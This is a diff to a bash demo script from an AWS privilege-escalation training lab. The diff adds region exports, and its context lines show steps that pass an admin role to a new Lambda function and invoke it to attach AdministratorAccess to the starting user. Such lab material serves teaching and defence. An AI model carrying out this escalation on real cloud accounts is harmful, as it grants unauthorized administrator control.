@@ -115,6 +115,7 @@ setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 echo "Using region: $AWS_REGION"
 
@@ -132,6 +133,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
@@ -141,6 +143,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
@@ -205,6 +208,7 @@ echo -e "${GREEN}✓ Malicious Lambda function payload prepared${NC}\n"
 echo -e "${YELLOW}Step 6: Creating Lambda function with admin role${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "This is the privilege escalation vector - passing the admin role to Lambda..."
 ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ADMIN_ROLE}"
 echo "Admin Role ARN: $ADMIN_ROLE_ARN"
@@ -268,6 +272,7 @@ echo -e "${GREEN}✓ Lambda function ready${NC}\n"
 echo -e "${YELLOW}Step 9: Invoking Lambda function to attach admin policy${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Invoking function: $LAMBDA_FUNCTION_NAME"
 
 show_cmd "Attacker" "aws lambda invoke --region $AWS_REGION --function-name \"$LAMBDA_FUNCTION_NAME\" --payload '{}' /tmp/response.json --output json"
@@ -300,6 +305,7 @@ echo -e "${GREEN}✓ Policy propagation complete${NC}\n"
 echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Checking if AdministratorAccess is now attached to starting user..."
 
 show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name \"$STARTING_USER\" --query 'AttachedPolicies[*].PolicyArn' --output text"
@@ -383,7 +389,7 @@ echo -e "${RED}⚠ AdministratorAccess is still attached to the starting user${N
 echo -e "${RED}⚠ Lambda functions incur charges when invoked${NC}"
 echo ""
 echo -e "${YELLOW}To clean up and restore the original state:${NC}"
-echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
+echo "  run plabs cleanup or use the plabs TUI/CLI"
 echo ""
 
 # Mark demo as active for plabs tracking
